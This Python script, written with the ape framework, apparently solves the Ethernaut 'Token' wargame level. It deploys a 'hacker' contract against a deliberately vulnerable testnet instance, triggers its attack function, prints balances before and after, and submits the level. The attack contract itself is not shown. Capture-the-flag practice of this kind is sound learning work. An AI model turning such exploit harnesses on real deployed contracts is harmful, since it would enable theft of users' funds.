from ape import accounts, project
from .utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0x391E93139F0D57F3294E96e71BCD1Dc69F83D44e"


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.Token.deploy(instance, sender=user)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")

    print(
        f"\n--- Our balance before the exploit: {hacker.instanceBalanceOf(user.address)} ---\n"
    )
    print(
        f"\n--- Our contract's balance before exploit: {hacker.instanceBalanceOf(hacker.address)} ---\n"
    )
    hacker.attack(sender=user)
    print(
        f"\n--- Our balance after the exploit: {hacker.instanceBalanceOf(user.address)} ---\n"
    )
    print(
        f"\n--- Our contract's balance after before exploit: {hacker.instanceBalanceOf(hacker.address)} ---\n"
    )

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
